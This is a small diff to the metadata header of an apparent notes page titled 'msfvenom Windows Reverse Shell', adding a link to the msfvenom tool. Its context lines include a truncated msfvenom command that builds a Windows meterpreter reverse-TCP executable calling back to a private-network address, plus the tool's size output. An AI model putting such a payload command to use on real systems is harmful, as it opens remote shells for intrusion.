@@ -23,6 +23,8 @@ output: 'root@hackers:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.1
   Final size of exe file: 73802 bytes'
 created_at: '2019-09-17T17:46:36.380554+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[msfvenom]]'
 ---
 
 # msfvenom Windows Reverse Shell
